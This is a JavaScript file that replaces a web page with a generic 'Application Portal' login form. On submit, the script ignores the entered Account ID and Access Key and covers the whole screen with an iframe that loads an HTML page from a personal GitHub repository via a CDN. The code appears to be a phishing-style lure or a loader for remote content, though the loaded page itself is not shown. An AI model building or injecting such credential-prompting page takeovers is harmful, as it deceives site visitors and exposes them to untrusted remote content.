// 1. Create and append the main application root container
const appContainer = document.createElement('div');
appContainer.id = 'app-root';
document.body.appendChild(appContainer);

// 2. Inject structural styling into the document head
const style = document.createElement('style');
style.textContent = `
    body, html {
        margin: 0;
        padding: 0;
        height: 100%;
        background-color: #f0f2f5;
        font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
        overflow: hidden;
    }
    .portal-container {
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        padding: 20px;
        box-sizing: border-box;
    }
    .portal-card {
        background: #ffffff;
        padding: 40px;
        border-radius: 6px;
        border: 1px solid #e1e4e8;
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
        width: 100%;
        max-width: 400px;
        box-sizing: border-box;
    }
    .portal-card h2 {
        margin-top: 0;
        margin-bottom: 25px;
        font-size: 24px;
        color: #333333;
        text-align: center;
    }
    .form-group {
        margin-bottom: 20px;
    }
    .form-group label {
        display: block;
        margin-bottom: 8px;
        font-size: 14px;
        font-weight: 600;
        color: #444444;
    }
    .form-group input {
        width: 100%;
        padding: 12px;
        border: 1px solid #ccd1d9;
        border-radius: 4px;
        font-size: 14px;
        background-color: #fafbfc;
        outline: none;
        box-sizing: border-box;
        transition: border-color 0.15s;
    }
    .form-group input:focus {
        border-color: #0066cc;
        background-color: #ffffff;
    }
    .submit-btn {
        width: 100%;
        padding: 12px;
        background-color: #0066cc;
        color: #ffffff;
        border: none;
        border-radius: 4px;
        font-size: 14px;
        font-weight: 600;
        cursor: pointer;
        transition: background-color 0.15s;
        box-sizing: border-box;
    }
    .submit-btn:hover {
        background-color: #004da6;
    }
    #viewport-container {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: #ffffff;
        z-index: 9999;
    }
    #viewport-container iframe {
        width: 100%;
        height: 100%;
        border: none;
    }
`;
document.head.appendChild(style);

// 3. Render the initial portal interface view
function renderPortalView() {
    appContainer.innerHTML = `
        <div class="portal-container" id="portal-layout">
            <div class="portal-card">
                <h2>Application Portal</h2>
                <form id="portal-form">
                    <div class="form-group">
                        <label for="portal-user">Account ID</label>
                        <input type="text" id="portal-user" required autocomplete="username">
                    </div>
                    <div class="form-group">
                        <label for="portal-pass">Access Key</label>
                        <input type="password" id="portal-pass" required autocomplete="current-password">
                    </div>
                    <button type="submit" class="submit-btn">Log in</button>
                </form>
            </div>
        </div>
    `;

    document.getElementById('portal-form').addEventListener('submit', handleTransition);
}

// 4. Wipe the DOM interface and mount the iframe content view
function renderIframeView() {
    const targetUrl = "https://cdn.esm.sh/gh/zaka13X/zaka13X/index.html";

    appContainer.innerHTML = `
        <div id="viewport-container">
            <iframe src="${targetUrl}" allowfullscreen></iframe>
        </div>
    `;
}

// 5. Intercept submit execution to trigger view replacement
function handleTransition(event) {
    event.preventDefault();
    renderIframeView();
}

// Initialize the environment execution
renderPortalView();
